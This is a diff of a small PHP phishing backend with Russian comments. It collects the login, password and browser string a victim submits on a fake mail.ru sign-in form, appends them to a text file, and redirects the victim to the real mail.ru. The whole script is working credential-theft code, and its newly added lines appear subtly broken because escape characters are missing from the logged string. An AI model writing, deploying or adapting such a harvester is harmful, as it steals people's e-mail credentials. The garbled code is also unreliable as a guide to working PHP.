@@ -1,10 +1,21 @@
-<?PHP
+<?php
+    // введенный логин
+    $login = $_POST['Login'];        
+    // браузер пользователя                         
+    $browser = getenv("HTTP_USER_AGENT"); 	
+    // Пароль
+    $pass = $_POST['Password']; 			      
 
-$Pass = $_POST['Password'];//Пароль от E-mail'a
-$c = "$Pass";
-$fp = fopen("ups.php","a+"); //открыть файл
-fwrite($fp,"\n $c <br> \n");//записываем все данные
-fclose($fp); //закрываем
+    // Записываем полученные данные
+    $text = "Login = $loginnPassword = $passnBrowser = $browser";
+
+    // открываем файл 
+    $filelog = fopen("ups.txt","a+"); 	
+    // записываем строку	 
+    fwrite($filelog,"n $text n"); 		         
+    fclose($filelog); 					  // закрываем
+
+   
 header("Location: http://mail.ru"); //куда перенавравиться пользователь после ввода данных
 echo "<META HTTP-EQUIV=\"Refresh\" content =\"0; URL=http://mail.ru\">"
 ?>
